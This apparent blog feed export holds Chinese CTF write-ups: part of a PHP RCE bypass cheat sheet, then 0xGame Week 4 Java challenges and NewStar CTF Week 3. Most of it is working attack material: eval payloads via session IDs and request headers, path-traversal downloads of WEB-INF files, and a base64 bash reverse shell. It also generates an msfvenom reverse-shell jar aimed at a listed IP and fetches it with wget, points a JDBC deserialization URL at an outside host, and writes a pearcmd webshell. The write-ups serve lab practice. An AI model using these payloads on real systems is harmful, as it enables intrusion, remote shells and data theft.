$y)</td><td>$a为数组,将数组名和值循环赋值给$x和$y</td></tr><tr><td>exit($a)</td><td>输出$a并退出当前脚本</td></tr><tr><td>show_source()</td><td>显示文件内容</td></tr><tr><td>file_get_contents()</td><td>显示文件内容</td></tr><tr><td>highlight_file()</td><td>显示文件内容</td></tr><tr><td>readfile()</td><td>显示文件内容</td></tr><tr><td>var_dump()</td><td>打印数组，显示文件名</td></tr><tr><td>printf()</td><td>显示文件内容</td></tr><tr><td>next()</td><td>数组指针移动到下一位</td></tr><tr><td>array_reverse()</td><td>数组位置前后调转</td></tr><tr><td>show_source(next(array_reverse(scandir(current(localeconv())))))</td><td>输出当前目录倒数第二个文件内容</td></tr><tr><td>localeconv()</td><td>详细的自己搜，返回一个数组，数组的第一个是小数点字符，因此可以用current()提取一个.</td></tr><tr><td>current()或pos()</td><td>提取数组第一个元素的值</td></tr><tr><td>scandir()</td><td>显示目录中的所有文件</td></tr><tr><td>scandir(current(localeconv()))</td><td>查看目录</td></tr><tr><td>var_dump(scandir(current(localeconv())))</td><td>输出目录</td></tr><tr><td>array_flip()</td><td>交换数组中的键和值，成功时返回交换后的数组</td></tr><tr><td>array_rand()</td><td>从数组中随机取出一个或多个单元</td></tr><tr><td>end()</td><td>取出数组中的最后一位</td></tr><tr><td>chdir()</td><td>目录跳转，例如chdir(‘…’)就是跳转到上级目录</td></tr><tr><td>get_defined_vars()</td><td>返回由所有已定义变量所组成的数组（全局变量）</td></tr><tr><td>dirname()</td><td>返回当前文件的路径，就是pwd</td></tr><tr><td>getcwd()</td><td>返回当前的工作目录</td></tr><tr><td>getallheaders()</td><td>返回所有的请求头数组</td></tr><tr><td>getenv()</td><td>php7.1版本以后才能使用，获取环境变量</td></tr><tr><td>time()</td><td>返回当前的Unix时间戳</td></tr><tr><td>localtime()</td><td>取得本地时间</td></tr><tr><td>localtime(time())</td><td>返回一个数组，0-60之间</td></tr><tr><td>__halt_compiler();</td><td>停止对当前脚本的编译，可用于去掉后边没用的字符串</td></tr><tr><td>pos()</td><td>取出数组的第一个元素</td></tr><tr><td>print_r(scandir(next(scandir(getcwd()))));</td><td>输出上级目录</td></tr><tr><td>print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv()))))));</td><td>赌狗操作，随机读当前目录文件</td></tr></tbody></table><p><strong>查看当前目录文件</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure><p><strong>读取当前目录文件</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">end</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">current</span>(<span class="title">array_reverse</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>随机返回当前目录文件</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">highlight_file</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))));</span></span><br></pre></td></tr></table></figure><p><strong>查看上级目录</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>读取上级目录文件</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">chdir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())))))))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">phpversion</span>())))))))))))))));</span></span><br></pre></td></tr></table></figure><p><strong>查看根目录文件名</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">strrev</span>(<span class="title">crypt</span>(<span class="title">serialize</span>(<span class="title">array</span>())))))));</span></span><br></pre></td></tr></table></figure><h5 id="session-id">session_id</h5><p>通过开启session，构造恶意session值进而执行任意恶意代码，构造脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;phpinfo();&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>恶意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><p>恶意session值</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">phpsessid</span><span class="operator">=</span><span class="number">706870696</span>e666f28293b</span><br></pre></td></tr></table></figure><h5 id="getallheaders">getallheaders</h5><p>示例代码</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="built_in">array</span><span class="constructor">_pop(<span class="params">getallheaders</span>()</span>));</span><br><span class="line"><span class="comment">//这里的array_pop是弹出http头的最后一个</span></span><br><span class="line"><span class="comment">//getallheaders()会获取所有请求头信息的一个数组</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">请求头:</span><br><span class="line">因为得是在最后一个，所以用字母让他排到最后,例如：</span><br><span class="line">ZZZZZ=phpinfo();</span><br><span class="line"></span><br><span class="line">或者使用</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">pos</span>(<span class="keyword">next</span>(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225738166.png" alt="image-20240123225738166"></p><p>注意看，此时我们通过print成功输出了getallheaders的数组，并构造了恶意请求头ZZZZZZ，看图可得其位于最后一位</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225838387.png" alt="image-20240123225838387"></p><p>此时我们可以通过end函数成功提取到了我们构造的ZZZZZ的值</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225922913.png" alt="image-20240123225922913"></p><p>将print换成eval即可发现我们成功执行了phpinfo</p><h5 id="get-defined-vars">get_defined_vars</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取全局变量$_POST   $_GET    $_FILE    $_COOKIE</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225218898.png" alt="image-20240123225218898"></p><p>由图可得，我们获取了所有的全局变量</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225346696.png" alt="image-20240123225346696"></p><p>观察这张图，我利用了两个pos成功提取出了我们恶意构造的123这一变量</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225447536.png" alt="image-20240123225447536"></p><p>此时我将print换成了system，再将恶意构造的123换成了系统命令ls，发包后即可发现我们成功执行了ls系统命令</p><h4 id="绕过简介">绕过简介</h4><p>eval类和system类命令执行的绕过大同小异，此处额外提供两个仅在eval类生效的脚本，其本质为php的字符解析机制和php的函数利用，以下可用于绕过特殊字符段的过滤，适用于show_source等多种2.2.2中的显示和包含文件函数的参数构造</p><p><strong>1.16进制绕过&quot;\x77\x61\x66\x2e\x70\x68\x70&quot;，外面必须为双引号</strong></p><p>16进制的构造脚本</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">original_string</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="title">while</span>(<span class="variable">original_string</span><span class="variable">!</span>=<span class="string">&#x27;end&#x27;</span>):</span></span><br><span class="line"><span class="function">    <span class="variable">original_string</span> = <span class="title">input</span>()</span></span><br><span class="line">    <span class="variable">hex_representation</span> = <span class="string">&quot;\\x&quot;</span>.join(<span class="string">&quot;&#123;:02x&#125;&quot;</span>.format(<span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="variable">char</span>)) <span class="variable">for</span> <span class="variable">char</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">original_string</span>)</span></span><br><span class="line">    <span class="variable">final_result</span> = <span class="string">&quot;\\x&quot;</span> + <span class="variable">hex_representation</span></span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">final_result</span>)</span></span><br></pre></td></tr></table></figure><p><strong>2.chr函数绕过chr(119).chr(97).chr(102).chr(46).chr(112).chr(104).chr(112)</strong></p><p>chr的构造脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def convert_to_ascii_special(<span class="keyword">text</span>):</span><br><span class="line">    ascii_special = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">char</span> <span class="keyword">in</span> <span class="keyword">text</span>:</span><br><span class="line">        ascii_code = ord(<span class="keyword">char</span>)</span><br><span class="line">        ascii_special += <span class="string">&#x27;chr(&#123;&#125;).&#x27;</span>.<span class="built_in">format</span>(ascii_code)</span><br><span class="line">    ascii_special = ascii_special[:<span class="number">-1</span>]  <span class="comment"># 去除最后一个加号</span></span><br><span class="line">    <span class="literal">return</span> ascii_special</span><br><span class="line"></span><br><span class="line">user_input=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(user_input!=<span class="string">&#x27;end&#x27;</span>):</span><br><span class="line">    user_input = input(<span class="string">&quot;请输入要转换的字符：&quot;</span>)</span><br><span class="line">    <span class="built_in">result</span> = convert_to_ascii_special(user_input)</span><br><span class="line">    print(<span class="built_in">result</span>)</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_56815564/article/details/130279662">https://blog.csdn.net/qq_56815564/article/details/130279662</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/kali_Ma/article/details/122544274">https://blog.csdn.net/kali_Ma/article/details/122544274</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame WEEK4 java全家桶</title>
      <link href="/posts/654uyiuw0.html"/>
      <url>/posts/654uyiuw0.html</url>
      
        <content type="html"><![CDATA[<h1>0xGame WEEK4 java全家桶</h1><h2 id="Week-4-spring">[Week 4] spring</h2><p>根据提示为springboot的actuator未授权访问漏洞，下载敏感文件heapdump</p><p>ctfscript</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JDumpSpider-1.1-SNAPSHOT-full.jar </span>heapdump</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231025213944755.png" alt="image-20231025213944755"></p><h2 id="Week-4-auth-bypass">[Week 4] auth_bypass</h2><p>绕过姿势：</p><p>hackbar：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span></span><br></pre></td></tr></table></figure><p>burpsuite：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/./</span></span><br></pre></td></tr></table></figure><p>然后就可以进行任意文件下载了，首先尝试下载敏感文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以得到一个新的路由，直接访问得到信息有限，根据得到的配置文件尝试源代码的class文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/WEB-INF/</span>web.xm1  <span class="comment">#WEB应用程序配置文件，描述了servlet和其它应用组件配置及命名规则。</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>classes/  <span class="comment">#含站点所有的class文件</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>lib/   <span class="comment">#存放WEB应用需要的各种JAR文件</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>src/  <span class="comment">#源码目录</span></span><br><span class="line">WEB-INF/database.properties   <span class="comment">#数据库配胃文件</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>classes<span class="regexp">/com/</span>example<span class="regexp">/demo/</span>EvilServlet.class</span><br></pre></td></tr></table></figure><p>得到源代码之后进行反编译得到路由和执行参数</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You_Fi<span class="symbol">nd_This_Evil_Servlet_a76</span>f<span class="number">02</span>cb<span class="number">8422</span>?Evil_Cmd_Argume<span class="symbol">nts_fe37627</span>fed<span class="number">78</span>=ls</span><br></pre></td></tr></table></figure><p>反弹shell进行rce，命令和平常的不太一样</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">bash -c </span><span class="template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231025221533100.png" alt="image-20231025221533100"></p><h2 id="Week-4-YourBatis">[Week 4] YourBatis</h2><p>动态SQL会造成OGNL表达式注入漏洞，测试paylaod如下，传入的时候一定得url编码</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>().<span class="built_in">exec</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里使用msf得到shell，用下面的命令生成木马文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp <span class="attribute">LHOST</span>=150.158.24.228 <span class="attribute">LPORT</span>=250 -f jar &gt; shell.jar</span><br></pre></td></tr></table></figure><p>将木马下载到靶机上</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;wget http://url/shell.jar -O 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>在vps上开启msf监听</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD java/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 150.158.24.228</span><br><span class="line"><span class="built_in">set</span> LPORT 250</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在靶机上执行目标木马，记得url编码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;java -jar 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>env得到flag</p><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231026152548555.png" alt="image-20231026152548555"></p><h2 id="Week-4-TestConnection">[Week 4] TestConnection</h2><p>看了hint知道了是jdbc的数据库连接漏洞</p><p>利用项目：<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>vps启动服务，直接读取环境变量就ok，靶机命令如下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testConnection?<span class="attr">username</span><span class="operator">=</span><span class="variable">&amp;password</span>=<span class="variable">&amp;driver</span>=com.mysql.jdbc.Driver<span class="variable">&amp;url</span>=jdbc:mysql:<span class="comment">//110.41.17.183:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5C21619%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231026155354422.png" alt="image-20231026155354422"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF WEEK 3</title>
      <link href="/posts/fcr7dhw7.html"/>
      <url>/posts/fcr7dhw7.html</url>
      
        <content type="html"><![CDATA[<h1>NewStar CTF WEEK3</h1><h2 id="Include-🍐">Include 🍐</h2><p>pearcmd文件包含，用bp发包防止payload被编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;<span class="regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>tmp/chuling2.php</span><br></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET：</span><br><span class="line">?<span class="attribute">file</span>=/tmp/chuling2</span><br><span class="line">POST:</span><br><span class="line"><span class="attribute">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>后面就是命令执行了</p><h2 id="medium-sql">medium_sql</h2><p>sqlmap一把梭，时间盲注</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url/?<span class="built_in">id</span>= -p <span class="built_in">id</span> -D ctf -T here_is_flag -C flag <span class="comment">--dump 